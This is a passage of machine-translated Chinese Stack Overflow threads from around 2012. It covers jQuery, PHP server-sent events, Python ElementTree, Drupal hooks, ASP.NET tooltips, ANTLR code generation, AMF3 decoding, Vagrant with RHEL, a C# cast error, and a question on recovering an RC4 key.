关于我需要调整什么以使 FrontPage 身份验证工作和 .htaccess 文件中的 WP 组件的任何建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T16:01:17.957

在子目录中的所有 htaccess 文件中，添加：

```
RewriteEngine On 
```

因此，不会应用来自文档根目录的重写规则。

# jquery - jQuery - 动画运行时禁用功能

> ID：12460668
> 
> 赞同：0
> 
> 时间：2012-09-17T13:48:44.393
> 
> 标签：jquery, function, scroll

我正在使用下面的代码将滚动类添加到粘性导航栏。它工作正常，但我希望它在单击导航栏中的 li 元素时禁用滚动功能，因此当用户单击导航后的滚动动画开始时它不会开始更改类，所以我想我需要禁用滚动功能，直到滚动动画完成。有什么建议么？

编辑也许我在这里不清楚。当用户单击 li 项目时，我使用滚动动画。我还使用了一个函数，如果用户滚动到 li 项目所在的 div，它将添加活动类。当用户现在位于页面顶部并单击其中一个 li 项目时，活动类将首先添加到他们单击的 li 中，然后添加到所有 li 项目中，但我希望它只保留在 li他们点击的项目，所以也许我需要禁用在滚动功能上添加活动类，直到点击的滚动动画完成？

```
$(window).scroll(function(){
    var top = $(window).scrollTop(),
    nav_distance = 450,
    grid_3_distance = $("section.grid.third").offset().top - 1,
    grid_4_distance = $("section.grid.fourth").offset().top - 230;

    if(top > nav_distance) {
        $("section.grid.second ul").addClass("fixed");
    } else if(top < nav_distance) {
        $("section.grid.second ul").removeClass("fixed");
    }

    if(top > nav_distance){
        $("section.grid.second ul nav li").removeClass("active");
        $("section.grid.second ul nav li[data-intern='.grid.second']").addClass("active");
    }

    if(top > grid_3_distance){
        $("section.grid.second ul nav li").removeClass("active");
        $("section.grid.second ul nav li[data-intern='.grid.third']").addClass("active");
    }

    if(top > grid_4_distance){
        $("section.grid.second ul nav li").removeClass("active");
        $("section.grid.second ul nav li[data-intern='.grid.fourth']").addClass("active");
    }
});

$(function(){
    $("section.grid.second ul nav li").click(function(){
        $("section.grid.second ul nav li").removeClass("active");
        $(this).addClass("active");
        var id = $(this).attr("data-intern");
        $('html,body').animate({scrollTop:$(id).offset().top}, 500);
    }); 
```

# php - MySQL的filemtime替代品

> ID：12460672
> 
> 赞同：0
> 
> 时间：2012-09-17T13:48:59.090
> 
> 标签：php, mysql, push-notification

我正在玩一些推送通知，并且希望在数据库发生更改时更新页面。

我有这个来自[http://www.screenr.com/SNH](http://www.screenr.com/SNH)：

```
<?php
$filename = dirname(__FILE__).'/data.php';

$lastmodif = isset($_GET['timestamp']) ? $_GET['timestamp'] : 0;
$currentmodif = filemtime($filename);

while ($currentmodif <= $lastmodif) {
  usleep(10000);
  clearstatcache();
  $currentmodif = filemtime($filename);
}

$response = array();
$response['msg'] = file_get_contents($filename);
$response['timestamp'] = $currentmodif;
echo json_encode($response);
?> 
```

我的 data.php 是一个从 JSON 文件中获取数据的脚本：

```
<script>function itnews_overview() {
    $.getJSON('/ajax.php?type=itnews_overview', function(data) {
        $.each(data.data, function(option, type) {
            $('.bjqs').append('<li><span class="date">'+ type.submitted +'<br />'+     type.time +'</span><h2>' + type.title + '</h2><p>' + type.content + '</p></li>');
        });

    });

}
</script>

<script>
  itnews_overview();
</script>
<div id="news">
  <ul class="bjqs"></ul>
</div> 
```

更新：来自 index.php 的代码：

```
<script type="text/javascript">

  var timestamp = null;

  function waitForMsg() {
$.ajax({
  type: "GET",
  url: "getData.php?timestamp=" + timestamp,
  async: true,
  cache: false,

  success: function(data) {
    var json = eval('(' + data + ')');
    if(json['msg'] != "") {
      $(".news").html(json['msg']);

    }

    timestamp = json['timestamp'];
    setTimeout('waitForMsg()',1000);        
  },

  error: function(XMLHttpRequest, textStatus, errorThrown){
    setTimeout('waitForMsg()',15000);
  }

});
  }

  $(document).ready(function(){
  waitForMsg();
});

</script> 
```

由于当我向数据库添加内容时未保存此文件，因此 filemtime 将不起作用 - 是否有另一种方法可以检查是否已将新行添加到表中？

**更新：**试图用 SSE 解决这个问题。我有两个文件，index.php 和 send_sse.php（灵感来自[http://www.developerdrive.com/2012/03/pushing-updates-to-the-web-page-with-html5-server-sent-events /](http://www.developerdrive.com/2012/03/pushing-updates-to-the-web-page-with-html5-server-sent-events/) )

索引.php：

```
<div id="serverData">Content</div>
<script type="text/javascript">
//check for browser support
if(typeof(EventSource)!=="undefined") {
    //create an object, passing it the name and location of the server side script
    var eSource = new EventSource("send_sse.php");
    //detect message receipt
    eSource.onmessage = function(event) {
        //write the received data to the page
        document.getElementById("serverData").innerHTML = event.data;
    };
}
else {
    document.getElementById("serverData").innerHTML="Whoops! Your browser doesn't receive server-sent events.";
}
</script> 
```

发送_sse.php：

```
<?php
header('Content-Type: text/event-stream');
header('Cache-Control: no-cache');

$url = "content.json";
$str = file_get_contents($url);
$data = json_decode($str, TRUE);
//generate random number for demonstration
//echo the new number
echo "data: " . json_encode($data);

ob_flush();
?> 
```

但是，这似乎不起作用，这可能是因为 SSE 需要纯文本数据。我只是不知道如何做到这一点，然后将该内容包装在几个 HTML 标记中。

**更新：**好的，现在它可以与 SSE 合作，这要感谢 VDP。我有以下内容：

```
$sql= "SELECT title, content, submitted FROM `flex_itnews` where valid = 1 order by submitted desc";
$query= mysql_query($sql);
setlocale(LC_ALL, 'da_DK');
while($result = mysql_fetch_array($query)){
    echo "data: <li><span class='date'>". strftime('%e. %B', strtotime($result['submitted'])) ."<br />kl. ". strftime('%H.%M', strtotime($result['submitted'])) ."</span><h2>" . $result['title']. "</h2><p>" . $result['content'] ."</p></li>\n";
} 
```

但是，当我添加任何新内容时，它只是 echo `data: data: data`。如果我刷新页面，它会正确显示。

**更新：**使用 livequery 插件：

```
 <script>
      var source = new EventSource('data2.php');
      source.onmessage = function (event) {
        $('.bjqs').html(event.data);
      };

      $('#news').livequery(function(){
        $(this).bjqs({
          'animation' : 'slide',
          'showMarkers' : false,
          'showControls' : false,
          'rotationSpeed': 100,
          'width' : 1800,
          'height' : 160
        });
      });

  </script> 
```

**更新：**尝试使用委托（）

```
 <script>
      $("body").delegate(".news", "click", function(){
        $("#news").bjqs({
          'animation' : 'slide',
          'showMarkers' : false,
          'showControls' : false,
          'rotationSpeed': 100,
          'width' : 1800,
          'height' : 160
        });
                var source = new EventSource('data2.php');
      source.onmessage = function (event) {
        $('.bjqs').append(event.data);
      };
      });
  </script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T13:54:17.313

是的！有多种（更好的）方法：

1.  websocket（最好的解决方案，但不支持旧版或移动浏览器）
2.  服务器发送事件 (SSE)（一种轮询，但仅针对您要求的任务进行了优化）
3.  长轮询（就像你正在做的那样）
4.  闪光灯插座
5.  其他基于插件的套接字东西
6.  ajax 轮询

我之前已经发布了另一个带有示例的[答案](https://stackoverflow.com/a/12316758/729375)

我列出了几种运输方式。websockets 是理想的（因为它是服务器和客户端之间唯一的双向通信），SSE 是我的第二选择。您将不需要该`$.getJSON`方法。总体思路将是相同的。

在服务器端（在您的情况下为 php）您查询数据库以进行更改。您将数据作为 JSON 返回（`json_encode(data)`可以这样做）。在客户端，您解码 JSON（`JSON.parse(data)`可以这样做）。使用您收到的数据更新您的页面。

只是像您这样的轮询会导致更多开销，因为您正在向服务器发出大量请求。

SSE 更多的是“我想订阅一个流”和“我想停止收听”。=> 更少的开销

Websockets 更多：“我建立了一个连接。我谈服务器监听。服务器谈客户端监听”全双工连接。=> 最少的开销

**SSE 代码示例**

客户端访问的页面（例如 index.html 或 index.php）

这只是一个包含此 javascript 的普通 html 页面：

```
<html>
<head>
    <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script>
    <script>
        //javascript:
        var source = new EventSource('data.php');
        source.onmessage = function (event) {
            //here you do the stuff with the received messages.
            //like log it to the console
            console.log(event.data);
            //or append it to div
            $('#response').append(event.data);
        };
    </script>
</head>
<body>
    <div id="response"></div>
</body>
</html> 
```

“data.php”页面：

```
<?php
/* set the header first, don't echo/print anything before this header is set! Else the default headers will be set first then this line tries to set the headers and results in an error because the header is already set. */
header("Content-Type: text/event-stream\n\n");

//query the database
$sql= "SELECT COUNT(*) FROM `messages`";
$query= mysql_query($sql);
$result = mysql_fetch_array($query);
$count = $result[0];

//return the data
echo "data: " . $count. "\n";
?> 
```

所以你只需要那 2 页。

**更新：**

我只看到你的评论而不是更新..对不起;）

如果你使用`.delegate()`你不应该使用 body 而是尝试一个尽可能高的树的选择器（`.bjqs`在你的情况下）。

在您的情况下，您甚至不需要直播、代理或所有这些！只需在内容更新后再次应用 bjqs。

```
 var source = new EventSource('data2.php');
  source.onmessage = function (event) {
    $('.bjqs').html(event.data);
    $("#news").bjqs({
      'animation' : 'slide',
      'showMarkers' : false,
      'showControls' : false,
      'rotationSpeed': 100,
      'width' : 1800,
      'height' : 160
    });
  }; 
```

这也会给您带来问题，因为您不断地重新初始化 bjqs，并且它不是为处理动态更新内容而编写的。**如果有新数据，您可以做的是仅发送数据（使用 php）。检查调用是否返回空，如果没有更新：**

```
 var source = new EventSource('data2.php');
  source.onmessage = function (event) {
    if(event.data !=""){
        $('.bjqs').html(event.data);
        $("#news").bjqs({
          'animation' : 'slide',
          'showMarkers' : false,
          'showControls' : false,
          'rotationSpeed': 100,
          'width' : 1800,
          'height' : 160
        });
    }
  }; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T13:56:14.257

您可以计算表中的行数，然后检查行数是否更改。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-19T10:49:52.187

在没有深入研究您的代码的情况下，我回答了标题中的问题：

将最后修改的列添加到您的表中，这有一个内置的 mysql 触发器，该触发器会在添加或更改行时更新：

```
ALTER TABLE `yourTable`
    ADD COLUMN `last_modified` TIMESTAMP NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
    ADD INDEX (`last_modified`); 
```

然后像这样查询它，

```
SELECT * FROM yourTable where last_modified > ? 
```

（“？”是您用上次查询的时间戳替换的 pdo 占位符）

# python - Python etree 控制空标签格式

> ID：12460677
> 
> 赞同：15
> 
> 时间：2012-09-17T13:49:25.737
> 
> 标签：python, xml

当使用 Python 的 etree 创建 XML 文件时，如果我们使用 向文件写入一个空标签`SubElement`，我会得到：

```
<MyTag /> 
```

不幸的是，我们在 Fortran 中使用的 XML 解析器库不能处理这个问题，即使它是一个正确的标记。它需要看到：

```
<MyTag></MyTag> 
```

有没有办法更改格式规则或 etree 中的其他内容以使其正常工作？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-09-17T13:59:01.213

从 Python 3.4 开始，您可以对[函数](https://docs.python.org/3/library/xml.etree.elementtree.html#xml.etree.ElementTree.tostring)和[方法](https://docs.python.org/3/library/xml.etree.elementtree.html#xml.etree.ElementTree.ElementTree.write)`short_empty_elements`使用参数：[`tostring()`](https://docs.python.org/3/library/xml.etree.elementtree.html#xml.etree.ElementTree.tostring)[`ElementTRee.write()`](https://docs.python.org/3/library/xml.etree.elementtree.html#xml.etree.ElementTree.ElementTree.write)

```
>>> from xml.etree import ElementTree as ET
>>> ET.tostring(ET.fromstring('<mytag/>'), short_empty_elements=False)
b'<mytag></mytag>' 
```

在较旧的 Python 版本（2.7 到 3.3）中，作为一种解决方法，您可以使用以下`html`方法写出文档：

```
>>> from xml.etree import ElementTree as ET
>>> ET.tostring(ET.fromstring('<mytag/>'), method='html')
'<mytag></mytag>' 
```

`ElementTree.write()`方法和函数都`tostring()`支持`method`关键字参数。

在更早版本的 Python（2.6 及之前）上，您可以安装外部 ElementTree 库；1.3 版支持该关键字。

是的，这听起来有点奇怪，但`html`输出主要输出空元素作为开始和结束标记。一些元素最终仍然是空标签元素；特别`<link/>`是 ,`<input/>`等`<br/>`。尽管如此，还是升级您的 Fortran XML 解析器以实际解析符合标准的 XML！

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2017-07-05T00:19:15.047

这在 Python 3.4 中直接解决了。从那时起，`write`方法`xml.etree.ElementTree.ElementTree`具有以下`short_empty_elements`参数：

> 控制不包含内容的元素的格式。如果为 True（默认值），它们将作为单个自闭合标签发出，否则它们作为一对开始/结束标签发出。

[xml.etree 文档](https://docs.python.org/3/library/xml.etree.elementtree.html#xml.etree.ElementTree.ElementTree.write)中的更多详细信息。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-08-11T21:22:19.213

添加一个空`text`是另一种选择：

```
etree.SubElement(parent, 'child_tag_name').text='' 
```

但请注意，这不仅会改变文档的表示形式，还会改变文档的结构：即`child_el.text`，将`''`代替`None`.

哦，就像 Martijn 所说，尝试使用更好的库。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-02-11T15:17:57.217

如果您有 sed 可用，则可以将 python 脚本的输出通过管道传输到

```
sed -e "s/<\([^>]*\) \/>/<\1><\/\1>/g" 
```

它将发现任何发生`<Tag />`并将其替换为`<Tag></Tag>`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-06-04T16:07:34.850

解释代码，`ElementTree.py`我使用的版本在方法中包含以下内容`_write`：

```
write('<' + tagname)
...
if node.text or len(node): # this line is literal
    write('>')
    ...
    write('</%s>' % tagname)
else:
    write(' />') 
```

为了引导程序计数器，我创建了以下内容：

```
class AlwaysTrueString(str):
    def __nonzero__(self): return True
true_empty_string = AlwaysTrueString() 
```

然后我`node.text = true_empty_string`在那些我想要一个打开关闭标签而不是自关闭标签的 ElementTree 节点上进行设置。

通过“引导程序计数器”，我的意思是为库方法构造一组输入（在这种情况下是一个具有某种奇怪的真值测试的对象），以便库方法的调用以我希望的方式遍历其控制流图. 这非常脆弱：在新版本的库中，我的 hack 可能会失败——你可能应该将“可能”视为“几乎可以保证”。一般来说，不要打破抽象障碍。它在这里对我有用。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-03-22T20:58:04.803

如果您有 python >=3.4，请使用`short_empty_elements=False`已在其他答案中显示的选项，但是：

1.  如果您已经拥有字符串形式的 XML，并且无法触摸生成它的代码。
2.  如果您遇到python <3.4..
3.  如果您使用的是坚持使用自闭合标签的不同 XML 库..

然后这个工作：

```
 xml = "<foo/><bar/>"
 xml = re.sub(r'<([^\/]+)\/\>', r'<\1></\1>', xml)

 print(xml)

 # output will be
 # <foo></foo><bar></bar> 
```

# drupal - 来自视图模块的 Drupal 7 钩子块标题

> ID：12460678
> 
> 赞同：1
> 
> 时间：2012-09-17T13:49:34.153
> 
> 标签：drupal, views, drupal-modules

我的视图在一个块中显示了我的站点的配置文件。现在，我正在尝试通过 hook_block_view_MODULE_DELTA_alter 更改该块的标题。这是我的自定义模块的代码：

```
<?php
function homepagefilter_block_view_views_new_users_alter(&$data, $block) {
$data['subject'] = t('New title of the block');
} 
```

我没有看到对块标题有任何影响...这是为什么呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T21:32:28.623

试试 hook_block_view_alter()。

```
function homepagefilter_block_view_alter(&$data, $block){
  if($block->delta == 'BLOCKID'){
    print_r($block);
    print_r($data['subject']);
  }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-09T06:11:47.080

Views 模块创建的块的增量看起来像“[view_name]-[display_name]”，默认情况下显示名称类似于“[type]_[number]”。这意味着您的块的完整增量可能类似于“new_users-block_1”。但是，您不能实现 homepagefilter_block_view_views_new_users-block_1_alter()，因为您不能在函数名中使用连字符。块菜单模块创建有一个类似的问题（[见这个问题](https://drupal.org/node/1076132)）。正如 Behzad 所说，您现在必须实现通用 hook_block_view_alter() 钩子。

# c# - 如何制作一个小的帮助对话框？

> ID：12460679
> 
> 赞同：1
> 
> 时间：2012-09-17T13:49:34.380
> 
> 标签：c#, asp.net, dialog

我的 asp.net Web 应用程序是用 C# 编写的。

在许多网站上，我看到一个表单域旁边的小超链接写着“这是什么？”

单击它时，会弹出一个小的帮助对话框，只要您将鼠标悬停在链接上，它就会继续显示。它通常是一个对话，解释表单的该部分要求什么。

我该怎么做呢？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T13:53:19.543

我认为您正在寻找**工具提示插件**。看一下

1.  [30 个时尚的 jQuery Tooltip 插件](http://www.1stwebdesigner.com/css/stylish-jquery-tooltip-plugins-webdesign/)或
2.  看看[博士。谷歌](https://www.google.at/search?q=qtooltip&aq=f&sugexp=chrome,mod=15&sourceid=chrome&ie=UTF-8#hl=de&sclient=psy-ab&q=tooltip%20plugin&oq=tooltip%20plugin&gs_l=serp.3..0l2j0i30l2j0i10i30j0i30l5.10849.12710.2.12920.14.14.0.0.0.0.317.3155.0j2j10j1.13.0...0.0...1c.1.vQkODHRPLnk&psj=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.&fp=993a71b657616ada&biw=1600&bih=775)

我个人一直在使用**qTip**。[qTip](http://craigsworks.com/projects/qtip/)有一些很好的例子可以帮助你！

正如*@uwe Keim*指出的那样，上面的一些*链接**已经**过时*了。所以这里我们有一些**当前的链接**

*   [**QTip2**](http://craigsworks.com/projects/qtip2/)
*   [**简单提示**](http://craigsworks.com/projects/simpletip/#)
*   [**30 个很酷的 jQuery ToolTip 插件**](http://www.tripwiremagazine.com/2012/07/jquery-tooltip-plugin.html)（2012 年 7 月 14 日）
*   [**小费**](http://projects.nickstakenburg.com/tipped)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T13:52:21.447

您可以使用 asp.net 方式或使用 jquery 来执行此操作

[http://weblogs.asp.net/sukumarraju/archive/2009/12/22/user-friendly-tooltip-using-ajax-hover-menu-extender-control.aspx](http://weblogs.asp.net/sukumarraju/archive/2009/12/22/user-friendly-tooltip-using-ajax-hover-menu-extender-control.aspx)

[http://weblogs.asp.net/cjdevos/archive/2008/03/29/asp-net-ajax-tooltipextender.aspx](http://weblogs.asp.net/cjdevos/archive/2008/03/29/asp-net-ajax-tooltipextender.aspx)

您可以使用 jquery 来完成此操作。

[http://speckyboy.com/2009/09/16/25-useful-jquery-tooltip-plugins-and-tutorials/](http://speckyboy.com/2009/09/16/25-useful-jquery-tooltip-plugins-and-tutorials/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T14:00:58.433

也看看 Ajac 控制工具包气球弹出：

[http://www.asp.net/ajaxLibrary/AjaxControlToolkitSampleSite/BalloonPopup/BalloonPopupExtender.aspx](http://www.asp.net/ajaxLibrary/AjaxControlToolkitSampleSite/BalloonPopup/BalloonPopupExtender.aspx)

# c# - 带有 CIL 代码编译器的 Antlr

> ID：12460683
> 
> 赞同：3
> 
> 时间：2012-09-17T13:49:45.050
> 
> 标签：c#, compiler-construction, antlr, cil

我正在为学习目的做一个编译器。

它使用针对 c# 代码生成的**Antlr工具。**

到目前为止，我可以处理语法。词汇，Sintatic，我的测试没问题。

我的目标是生成 CIL 字节码，我对它有点熟悉。

问题是......我不知道“输出”代码的好方法。我想要一些建议，例如生成它。

我的一个想法是创建一个类“编译器”，其中包含与节点相关的大量方法，并在迭代树时调用该方法。

想法：

```
Class Compiler
{
   private AppededStrings = "";

   void CreateClass();
   void EndClass();
   void AddParam();
   void setAtributeToTheClass("public");
   ... and so on ...
} 
```

这是一个好方法吗？我找不到一个专门讨论这个的话题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-24T17:25:51.930

该页面的某些部分[http://msdn.microsoft.com/en-us/magazine/cc136756.aspx](http://msdn.microsoft.com/en-us/magazine/cc136756.aspx)将为您工作:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-24T18:10:03.083

[这是来自ANTLR 3.x](http://www.antlr3.org/)的示例。

一旦你有来自 ANTLR 的[AST](http://en.wikipedia.org/wiki/Abstract_syntax_tree)，根据这个问题，下一个任务是将其转换为一组可执行指令。由于作者要求的不是汇编作为输出而是[CIL](http://en.wikipedia.org/wiki/Common_Intermediate_Language)并且正在使用 ANTLR，因此网络上最好的示例来自 ANTLR 的作者。在此[页面上](http://www.antlr.org/wiki/display/ANTLR3/LLVM)，Ter 讨论了如何使用[StringTemplate](http://www.stringtemplate.org/)工具生成成为指令的输出。虽然 Ter 使用流行的[LLVM](http://llvm.org/)进行演示，但同样的概念也适用于生成 CIL 作为作者请求。

另外一个选项。

当我使用[Mercury 时，](http://www.mercury.csse.unimelb.edu.au/)最初他们会生成 CIL 代码。在过去的几年里，CIL 没有得到维护，但人们仍然希望在 .Net 世界中使用 Mercury。由于在 .NET 世界中，任何 .NET 语言都编译为 CIL，因此通过生成 C# 作为 Mercury 编译器的输出，然后将 C# 编译为 CIL，他们实现了将 Mercury 编译为 CIL 的相同结果，但只是通过一种中间语言。任何地方都没有规定中间语言必须是低级语言。

# php - 如何在 PHP 中解码以 AMF3 编码的 AS3 对象

> ID：12460689
> 
> 赞同：1
> 
> 时间：2012-09-17T13:49:57.920
> 
> 标签：php, actionscript-3, apache-flex, amf, amfphp

我正在尝试解码通过 PHP 中 Flash 的套接字发送的对象。我尝试使用 AMFPHP 和 ZEND_AMF，但都没有奏效。

有人可以指出我在不使用 AMFPHP 的远程功能的情况下在 php 中解码 AMF3 编码对象的方式吗？数据是通过套接字发送的，所以我不能像通常 amfphp 那样使用远程对象。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-20T11:19:07.417

@Ivan Dyachenko 感谢您指向 SabreAMF 下面是我成功解码和映射从套接字上的 Flex/Flash 接收的 AMF3 编码对象的方式

```
include_once 'SabreAMF/AMF3/Serializer.php';
include_once 'SabreAMF/AMF3/Deserializer.php';
include_once 'SabreAMF/OutputStream.php';
include_once 'SabreAMF/InputStream.php';
include_once 'SabreAMF/TypedObject.php';
include_once 'SabreAMF/ClassMapper.php';

/************DECODER*****************/
SabreAMF_ClassMapper::registerClass('FLASH_CLASS_NAME','PHP_CLASS_NAME'); //CLASSES SHOULD BE SAME
$inputStream = new SabreAMF_InputStream($buffer);
$des = new SabreAMF_AMF3_Deserializer($inputStream);
$obj = $des->readAMFData();
//$obj will contain the instance of PHP_CLASS_NAME with the properties set as the values sent by Flex/Flash
/************END DECODER*****************/

/**************ENCODER******************/
$classObj = new PHP_CLASS(); //PHP_CLASS is your class
$object = new SabreAMF_TypedObject('FLASH_CLASS_NAME',$classObj); //FLASH_CLASS_NAME IS NAME OF CLASS AVAILABLE TO FLASH FOR MAPPING
$outputStream = new SabreAMF_OutputStream();
$serializer = new SabreAMF_AMF3_Serializer($outputStream);
$serializer->writeAMFData($object);
$output = $outputStream->getRawData();

//$output is AMF Encoded string to be sent to FLEX/FLASH. 
/***********END ENCODER***************/ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:30:02.933

您可以使用[SabreAMF](https://github.com/evert/SabreAMF)在 PHP 上编码/解码 AMF 数据。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-29T05:32:13.630

请看一下这个 - [https://github.com/neoxic/php-amf3](https://github.com/neoxic/php-amf3) - 这是一个非常可靠的 PHP 扩展，用于编码/解码 AMF3 流。

# redhat - Vagrant 和红帽企业许可

> ID：12460694
> 
> 赞同：9
> 
> 时间：2012-09-17T13:50:17.577
> 
> 标签：redhat, vagrant, rhel

我们的团队开始在 Mac OS X 机器上使用 Vagrant 进行开发，这样我们就可以更好地模拟我们的 Red Hat Enterprise Linux 生产环境。我们的运营团队表示，我们的红帽许可证仅涵盖在我们的 VMWare 集群上运行的实例。其他人如何使用 Vagrant 处理 RHEL 许可？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-04T11:19:17.237

我们遇到了同样的情况，并决定在我们的开发者机器上使用 CentOS。[https://www.centos.org/](https://www.centos.org/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-03-13T15:31:08.667

我下载了我在网上找到的基本 rhel 服务器，并用 Packer 构建了一个 vagrant box，用于 Vagrant/Test Kitchen。我被迫使用各种其他存储库（CentOS/EPEL/RPMFusion 等）而不是未经许可我无法访问的 RHN 存储库。我实际上写了一本小厨师食谱来编写初始安装后的所有自定义 /etc/yum.repos.d/*.repo 文件。它绝对适用于开发环境。如果您可以访问不同的 ISO，那么您可以使用 Packer 构建您需要的任何版本的 rhel。

[http://dtucker.co.uk/hack/creating-a-vagrant-base-box-for-rhel-with-bento.html](http://dtucker.co.uk/hack/creating-a-vagrant-base-box-for-rhel-with-bento.html)

[https://github.com/xacaxulu/packer-boxes/blob/master/README.md](https://github.com/xacaxulu/packer-boxes/blob/master/README.md) <----如果你想使用的盒子。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-10-08T09:27:12.427

你试过这个吗？

[https://access.redhat.com/downloads/content/293/ver=1/rhel---7/1.0.0/x86_64/product-downloads](https://access.redhat.com/downloads/content/293/ver=1/rhel---7/1.0.0/x86_64/product-downloads)

您是否还检查了开发人员订阅？ [https://access.redhat.com/support/offerings/developer/](https://access.redhat.com/support/offerings/developer/)

有一个博客指定如何将 vagrant 与 RHEL 一起使用......但我不能发布 3 个链接 :(

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-01-11T14:49:00.307

这是一个建议（我正在使用这种方法，因为我也在使用`rhel` `vagrant`用于运行`ansible`脚本的框）

[在此处](https://developers.redhat.com/)创建一个红帽开发者帐户（点击注册）。

从这里下载一个`rhel` `vagrant`盒子（您必须使用您之前创建的帐户登录。

点燃你的盒子并`ssh`进入它。

按照[这些](https://access.redhat.com/solutions/253273)说明注册您的虚拟机

# c# - 无法将类型对象隐式转换为 System.Reflection.Assembly

> ID：12460696
> 
> 赞同：0
> 
> 时间：2012-09-17T13:50:26.703
> 
> 标签：c#, .net, reflection

请帮我解决这个错误：

> 无法将类型“object”隐式转换为“System.Reflection.Assembly”。存在显式转换（您是否缺少演员表？）

谢谢！！！

**代码**

```
var assemblyName = AssemblyName.GetAssemblyName(assemblyPath);

var ads = new AppDomainSetup
               {
                  ApplicationBase = AppDomain.CurrentDomain.SetupInformation.ApplicationBase, 
                  DisallowCodeDownload = true 
               };

AppDomain newDomainName = AppDomain.CreateDomain("newDomainName", null, ads);

Assembly testLibrary = newDomainName.CreateInstanceAndUnwrap(assemblyName.Name,
                      typeof(System.Windows.Controls.UserControl).Name);  // Here the error occures 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T14:00:00.917

[CreateInstanceAndUnwrap](http://msdn.microsoft.com/en-us/library/b223a08k.aspx)返回创建类型的实例（`System.Windows.Controls.UserControl`在上面的代码中），而不是`Assembly`. 代码应该是：

```
UserControl userControl = (UserControl) newDomainName.CreateInstanceAndUnwrap(
    assemblyName.Name, typeof(System.Windows.Controls.UserControl).Name); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T13:52:17.970

尝试使用`FullName`属性：

```
typeof(System.Windows.Controls.UserControl).FullName 
```

编辑：

也试试 assemblyName.FullName

根据[msdn](http://msdn.microsoft.com/en-us/library/3c4f1xde.aspx)，两者都应该是全名。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T14:01:25.697

```
public Object CreateInstanceAndUnwrap(
    string assemblyName,
    string typeName) 
```

它返回一个对象，您需要一个程序集，请重新检查。

# c - 如何从解密和加密的数据中找到 RC4 密钥？

> ID：12460700
> 
> 赞同：1
> 
> 时间：2012-09-17T13:50:32.650
> 
> 标签：c, cryptanalysis, rc4-cipher

我在文档中进行了一些转储分析，显示了一堆加密数据，以及由此产生的解密数据。解释了使用的算法（简单的 RC4）。唯一缺少的信息是用于从加密数据到解密数据的密钥。

我正在用这个文档材料编写一个自动化测试。我可以选择自己的一些密钥并从明文中重新创建加密数据，但我想知道是否有任何简单的密码分析方法可以找到用于加密原始数据的原始密钥。

蛮力方法可能是可能的，因为密钥非常小，但我更感兴趣的是知道是否存在任何更聪明的方法。

以下是我当前的 C 加密代码（使用 OpenSSL）：

```
unsigned char source[16] = {
    0xdb, 0xa3, 0x13, 0x30, 0x79, 0xa3, 0xcd, 0x9e,
    0x48, 0xf4, 0x8f, 0x06, 0x37, 0x1b, 0x45, 0xdd};
unsigned char expected_target[16] = {
    0x00, 0x00, 0x06, 0x00, 0x0e, 0x00, 0x00, 0x00,
    0x6d, 0x69, 0x63, 0x72, 0x6f, 0x73, 0x6f, 0x66};
unsigned char target[16] = {};
unsigned char key[16] = {};

RC4_KEY crypt_key;
RC4_set_key(&crypt_key, 16, key);
RC4(&crypt_key, 16, source, target);

printf("key    = [%02x %02x %02x %02x %02x %02x %02x %02x "
               "- %02x %02x %02x %02x %02x %02x %02x %02x]\n",
    key[0], key[1], key[2], key[3],
    key[4], key[5], key[6], key[7],
    key[8],  key[9], key[10], key[11],
    key[12], key[13], key[14], key[15]);

printf("source = [%02x %02x %02x %02x %02x %02x %02x %02x "
               "- %02x %02x %02x %02x %02x %02x %02x %02x]\n",
    source[0], source[1], source[2], source[3],
    source[4], source[5], source[6], source[7],  
    source[8], source[9], source[10], source[11],
    source[12], source[13], source[14], source[15]);

printf("target = [%02x %02x %02x %02x %02x %02x %02x %02x "
               "- %02x %02x %02x %02x %02x %02x %02x %02x]\n",
    target[0], target[1], target[2], target[3],
    target[4], target[5], target[6], target[7],
    target[8], target[9], target[10], target[11],
    target[12], target[13], target[14], target[15]);

printf("expected_target = [%02x %02x %02x %02x %02x %02x %02x %02x "
                        "- %02x %02x %02x %02x %02x %02x %02x %02x]\n",
    expected_target[0], expected_target[1], expected_target[2], expected_target[3],
    expected_target[4], expected_target[5], expected_target[6], expected_target[7],
    expected_target[8], expected_target[9], expected_target[10], expected_target[11],
    expected_target[12], expected_target[13], expected_target[14], expected_target[15]); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T13:59:13.240

1.  不，没有已知的有效 RC4 破解方法。

2.  您需要数百万年的时间来暴力破解 128 位密钥。您可以尝试使用密码列表。

# javascript - TypeError：尝试替换有问题的字符时名称为空

> ID：12460703
> 
> 赞同：0
> 
